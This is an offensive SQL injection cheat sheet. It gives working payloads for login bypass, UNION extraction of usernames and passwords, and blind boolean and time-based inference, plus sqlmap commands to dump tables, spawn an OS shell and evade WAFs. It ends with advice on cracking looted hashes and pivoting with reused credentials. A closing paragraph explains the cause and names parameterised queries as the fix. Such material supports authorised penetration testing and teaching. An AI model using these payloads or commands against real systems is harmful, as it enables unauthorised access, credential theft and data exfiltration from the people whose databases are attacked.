SQL Injection (SQLi) - Cheat Sheet

Inject SQL through unsanitised input so the database runs your query - to
bypass auth, dump data, or in some cases get code execution on the DB host.
Manual payloads for understanding, sqlmap for speed.
Replace the placeholders (<...>) with your own values.


Step 1 - Find an injection point

Add a single quote to any parameter and watch for a SQL error or changed
behaviour:

    <param>='        ->  500 error / SQL syntax error = likely injectable
    <param>=1' AND '1'='1   vs   1' AND '1'='2   ->  different page = injectable

Test GET params, POST fields, headers (Cookie, User-Agent), and JSON values.


Step 2 - Auth bypass (classic login form)

Make the WHERE clause always true so the first user is returned:

    Username: admin' --
    Username: admin' #
    Username: ' OR '1'='1' --
    Password: anything

The -- (or #) comments out the rest of the query (e.g. the password check).


Step 3 - UNION-based extraction (in-band)

3a. Find the number of columns (increment until no error):

    <param>=1 ORDER BY 1-- -
    <param>=1 ORDER BY 2-- -      ... until it breaks; last working N = column count

3b. Find which columns are reflected on the page:

    <param>=-1 UNION SELECT 1,2,3-- -      (use the N from above)

3c. Pull data into the reflected columns:

    <param>=-1 UNION SELECT 1,version(),database()-- -            (MySQL/PG)
    <param>=-1 UNION SELECT 1,table_name,3 FROM information_schema.tables-- -
    <param>=-1 UNION SELECT 1,column_name,3 FROM information_schema.columns
        WHERE table_name='users'-- -
    <param>=-1 UNION SELECT 1,concat(username,':',password),3 FROM users-- -


Step 4 - Blind SQLi (no output, no errors)

Boolean-based - page changes on true vs false:

    <param>=1 AND 1=1-- -      (true  -> normal page)
    <param>=1 AND 1=2-- -      (false -> different/empty page)
    <param>=1 AND SUBSTRING(version(),1,1)='8'-- -    (infer char by char)

Time-based - DB sleeps when condition is true:

    <param>=1 AND IF(1=1,SLEEP(5),0)-- -       (MySQL)
    <param>=1; SELECT pg_sleep(5)-- -          (PostgreSQL)
    <param>=1 WAITFOR DELAY '0:0:5'-- -        (MSSQL)


Step 5 - Automate with sqlmap

Let sqlmap do the heavy lifting. Capture the request in Burp, save to file:

    sqlmap -r request.txt --batch

Or target a URL/param directly:

    sqlmap -u "http://<target>/page?id=1" -p id --batch

Common follow-ups:

    sqlmap -r request.txt --dbs                 # list databases
    sqlmap -r request.txt -D <db> --tables      # list tables
    sqlmap -r request.txt -D <db> -T users --dump   # dump a table
    sqlmap -r request.txt --current-user --is-dba   # privilege check
    sqlmap -r request.txt --os-shell            # OS shell (if DBA + stacked queries)

Useful flags: --level=5 --risk=3 (deeper), --tamper=space2comment (WAF evade),
--threads=10 (faster), --dump-all (everything).


Step 6 - What to do with the loot

  - Cracked/looted password hashes -> hashcat / john (see kerberos cheatsheets)
  - --os-shell / xp_cmdshell (MSSQL) -> code execution on the DB host
  - Reused creds -> pivot into other services (SMB, SSH, web admin)


Cheat: comment styles & quick refs
    -- -    /  #   (MySQL)         |   -- - (PostgreSQL, MSSQL)
    Stacked queries: ; SELECT ...  (MSSQL/PG yes, MySQL usually no)


Key idea: SQL injection happens when user input is concatenated into a query
instead of being parameterised. You break out of the data context with a quote,
then either rewrite the logic (auth bypass), append your own SELECT (UNION), or
ask yes/no questions and read the answer from page behaviour or response time
(blind). The fix is always prepared statements / parameterised queries.
